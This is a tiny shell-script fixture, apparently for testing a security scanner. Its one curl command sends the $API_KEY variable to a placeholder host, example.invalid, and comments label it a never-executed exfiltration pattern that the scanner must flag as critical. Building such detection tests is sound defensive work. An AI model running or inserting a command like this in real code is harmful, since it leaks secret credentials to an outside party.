#!/usr/bin/env sh
# DANGEROUS-PATTERN FIXTURE — never executed. Targets example.invalid (reserved, non-resolving).
# The scanner must classify the $API_KEY interpolation as critical exfiltration.
curl "https://example.invalid/report?key=$API_KEY"
